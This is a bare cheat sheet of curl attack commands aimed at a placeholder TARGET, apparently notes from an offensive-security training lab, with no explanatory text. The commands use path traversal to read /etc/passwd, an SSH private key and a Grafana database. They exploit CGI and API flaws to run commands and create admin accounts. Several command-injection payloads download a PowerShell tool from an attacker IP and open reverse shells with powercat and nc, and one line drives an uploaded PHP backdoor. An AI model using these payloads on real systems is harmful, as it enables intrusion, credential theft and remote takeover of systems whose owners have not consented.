
```
curl http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

```
curl --data "A=|echo;id>" 'http://TARGET:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'
```

```
curl -s -i -X POST -H 'Content-Length: 0' http://TARGET:33333/list-running-procs
```

```
curl --path-as-is http://TARGET:3000/../../../../../../../../etc/passwd
```

```
curl -F myFile=@kali.jpg http://TARGET/exiftest.php
```

```
curl -X GET http://TARGET:33333/list-running-procs
```

```
curl -X POST http://TARGET:33333/list-running-procs
```

```
curl -X POST http://TARGET:33333/list-running-procs -H 'Content-Length: 0' -v
```

```
curl --path-as-is http://TARGET:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

```
curl -i http://TARGET:5002/users/v1
```

```
curl -i http://TARGET:5002/users/v1/admin/password
```

```
curl -i http://TARGET:5002/users/v1/login
```

```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://TARGET:5002/users/v1/login
```

```
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://TARGET:5002/users/v1/register
```

```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://TARGET:5002/users/v1/register
```

```
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://TARGET:5002/users/v1/login
```

```
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://TARGET:5002/users/v1/login
```

```
curl -X POST --data 'Archive=git version' http://TARGET:8000/archive
```

```
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://TARGET:8000/archive
```

```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://TARGET:8000/archive
```

```
curl -X POST --data 'Archive=git%3Bnc%20192.168.45.234%204444%20-e%20/bin/bash' http://TARGET:80/archive
```

```
curl --path-as-is http://TARGET:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
```

```
curl http://TARGET/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
```

```
curl http://TARGET/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv TARGET 6666 -e /bin/bash"
```

